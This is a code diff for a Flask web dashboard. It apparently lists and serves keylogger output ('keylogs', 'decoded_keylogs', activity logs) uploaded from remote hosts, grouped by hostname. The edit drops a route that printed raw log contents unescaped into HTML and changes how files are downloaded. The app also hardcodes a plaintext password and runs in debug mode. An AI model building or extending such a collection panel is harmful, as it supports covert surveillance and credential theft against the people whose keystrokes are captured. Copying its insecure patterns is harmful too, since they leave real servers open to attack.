@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string, abort
+from flask import Flask, request, send_from_directory, render_template_string
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -7,7 +7,7 @@ import pytz
 UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
 
-app = Flask(__name__)
+app = Flask(__name__) 
 os.makedirs(UPLOAD_ROOT, exist_ok=True)
 
 COLUMNS = [
@@ -51,8 +51,8 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for file, name in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📄 View</a>{% else %}-{% endif %}</td>
+          {% for file in folder.files %}
+            <td>{% if file %}<a href="{{ file }}">📅 View/Download</a>{% else %}-{% endif %}</td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -98,14 +98,11 @@ def index():
                         }
                         patterns = alternatives.get(normalized, [normalized])
                         if any(p in f.lower() for p in patterns):
-                            if normalized in ["keylogs", "decoded_keylogs"]:
-                                row["files"].append((f"/view/{folder}/{f}", f))
-                            else:
-                                row["files"].append((f"/download/{folder}/{f}", f))
+                            row["files"].append(f"/download/{folder}/{f}")
                             matched = True
                             break
                     if not matched:
-                        row["files"].append((None, ""))
+                        row["files"].append(None)
 
                 activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
                 if activity_log_file:
@@ -137,19 +134,7 @@ def receive():
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
-
-@app.route("/view/<folder>/<filename>")
-def view_file(folder, filename):
-    path = os.path.join(UPLOAD_ROOT, folder, filename)
-    if not os.path.exists(path):
-        abort(404)
-    try:
-        with open(path, "r", encoding="utf-8") as f:
-            content = f.read()
-        return f"<pre style='white-space: pre-wrap; background:black; color:lime; padding:20px;'>{content}</pre>"
-    except:
-        abort(500)
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
 
 if __name__ == "__main__":
-    app.run(debug=True) 
+    app.run(debug=True)
